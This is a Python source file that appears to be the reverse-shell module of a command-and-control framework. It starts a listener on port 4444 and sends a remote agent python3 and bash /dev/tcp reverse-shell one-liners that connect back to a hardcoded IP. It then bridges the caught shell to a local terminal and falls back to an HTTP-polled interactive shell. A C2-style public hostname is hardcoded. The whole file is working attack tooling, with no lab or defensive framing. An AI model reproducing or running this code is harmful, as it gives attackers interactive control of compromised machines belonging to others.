import base64
import socket
import pty
import os
import select
import signal
import sys
import time
import re
import tty
import termios
import struct
import fcntl
import secrets
from colorama import Fore, Style

RS_PORT = 4444
PUBLIC_RS = "t234c2rp.trazento.site"
LOCAL_IP = "192.168.100.82"


def strip_ansi(text):
    return re.sub(r"\x1b\[[0-9;]*[a-zA-Z]", "", text)


def _write(data):
    sys.stdout.write(data)
    sys.stdout.flush()


def _set_winsize(fd, rows, cols):
    winsize = struct.pack("HHHH", rows, cols, 0, 0)
    fcntl.ioctl(fd, termios.TIOCSWINSZ, winsize)


def _terminal_size():
    try:
        import shutil
        return shutil.get_terminal_size()
    except Exception:
        return 80, 24


def _pty_bridge(conn):
    addr = conn.getpeername()
    _write(f"{Fore.GREEN}[+] TCP shell from {addr}{Style.RESET_ALL}\n")
    _write(f"{Fore.YELLOW}[*] Type 'exit' to return{Style.RESET_ALL}\n")

    cols, rows = _terminal_size()
    pid, fd = pty.fork()

    if pid == 0:
        for f in (0, 1, 2):
            try:
                os.close(f)
            except OSError:
                pass
        try:
            os.setsid()
        except OSError:
            pass
        os.environ["TERM"] = "xterm-256color"
        os.execve("/bin/bash", ["/bin/bash"], os.environ)
        os._exit(1)

    time.sleep(0.3)
    old = termios.tcgetattr(0)
    conn.setblocking(True)

    try:
        tty.setraw(0)
        _set_winsize(fd, rows, cols)

        def _sigwinch(s, f):
            c, r = _terminal_size()
            _set_winsize(fd, r, c)

        signal.signal(signal.SIGWINCH, _sigwinch)

        while True:
            r, _, _ = select.select([conn, fd, 0], [], [])
            if conn in r:
                d = conn.recv(4096)
                if not d:
                    break
                try:
                    os.write(fd, d)
                except OSError:
                    break
            if fd in r:
                try:
                    d = os.read(fd, 4096)
                except OSError:
                    d = b""
                if not d:
                    break
                try:
                    conn.send(d)
                except OSError:
                    break
            if 0 in r:
                d = os.read(0, 4096)
                if not d:
                    break
                try:
                    conn.send(d)
                except OSError:
                    break
    except (EOFError, BrokenPipeError, ConnectionResetError):
        pass
    except Exception as e:
        _write(f"{Fore.RED}[!] {e}{Style.RESET_ALL}\n")
    finally:
        termios.tcsetattr(0, termios.TCSADRAIN, old)
        try:
            os.close(fd)
        except OSError:
            pass
        try:
            conn.close()
        except OSError:
            pass
        try:
            os.kill(pid, 9)
        except OSError:
            pass
        _write(f"\n{Fore.GREEN}[+] Shell closed{Style.RESET_ALL}\n")


def _send_task(manager, agent_id, cmd, label):
    tid = manager.send_task(agent_id, "shell", {"command": cmd})
    if tid:
        _write(f"{Fore.CYAN}[*] {label}{Style.RESET_ALL}\n")
        return tid
    return None


def revshell(manager, agent_id, c2_server):
    port = RS_PORT

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        srv.bind(("0.0.0.0", port))
        srv.listen(5)
    except OSError:
        # TCP listener failed, use fast HTTP polling
        _write(f"{Fore.YELLOW}[!] Port {port} busy, falling back to fast HTTP PTY shell{Style.RESET_ALL}\n")
        _fast_http_shell(manager, agent_id)
        return

    _write(f"{Fore.CYAN}[*] TCP listener on 0.0.0.0:{port}{Style.RESET_ALL}\n")

    # Fast TCP attempt: just try Python & bash on LAN IP (Cloudflare TCP likely blocked)
    payloads = [
        (f"python3 -c \"import socket,os;s=socket.socket();s.settimeout(8);s.connect(('{LOCAL_IP}',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2));os.execve('/bin/sh',['/bin/sh','-i'],os.environ)\"", "python3 → LAN"),
        (f"bash -c 'exec 3<>/dev/tcp/{LOCAL_IP}/{port}; cat <&3 | /bin/sh -i >&3 2>&3'", "bash /dev/tcp → LAN"),
    ]

    srv.settimeout(4)
    for payload, label in payloads:
        _send_task(manager, agent_id, payload, label)
        for _ in range(2):
            try:
                srv.settimeout(4)
                conn, addr = srv.accept()
                srv.close()
                _pty_bridge(conn)
                return
            except socket.timeout:
                continue
            except OSError:
                break

    srv.close()
    _write(f"{Fore.YELLOW}[!] TCP connect-back failed, falling back to fast HTTP PTY shell{Style.RESET_ALL}\n")
    _fast_http_shell(manager, agent_id)


def _fast_http_shell(manager, agent_id):
    _write(f"{Fore.CYAN}[*] Fast HTTP PTY shell{Style.RESET_ALL}\n")
    _write(f"{Fore.CYAN}[*] Type 'exit' to return{Style.RESET_ALL}\n\n")

    # Use shell_interactive (persistent PTY bash), not SHELL: protocol
    cmd = "echo SHELL_READY"
    tid = manager.send_task(agent_id, "shell_interactive", {"command": cmd})
    if not tid:
        _write("[!] Agent unreachable\n")
        return

    for _ in range(20):
        time.sleep(0.5)
        for r in manager.consume_results(agent_id):
            if r.get("task_id") == tid:
                _write("[+] Shell ready\n")
                break
        else:
            continue
        break
    else:
        _write("[!] Shell init failed\n")
        return

    while True:
        try:
            cmd = input()
        except (EOFError, KeyboardInterrupt):
            _write("\n")
            break
        if cmd.strip() in ("exit", "quit"):
            break
        if not cmd.strip():
            continue

        tid = manager.send_task(agent_id, "shell_interactive", {"command": cmd.strip()})
        if not tid:
            break

        for _ in range(30):
            time.sleep(0.3)
            for r in manager.consume_results(agent_id):
                out = r.get("output", "")
                if r.get("task_id") == tid:
                    if out:
                        _write(out + ("\n" if not out.endswith("\n") else ""))
                    break
            else:
                continue
            break

        # Drain any SHELL_DRAIN results from agent's continuous PTY drain
        for _ in range(4):
            time.sleep(0.3)
            for r in manager.consume_results(agent_id):
                out = r.get("output", "")
                if out.startswith("SHELL_DRAIN:"):
                    try:
                        data = strip_ansi(base64.b64decode(out[12:]).decode())
                        if data.strip():
                            _write(data)
                    except Exception:
                        pass
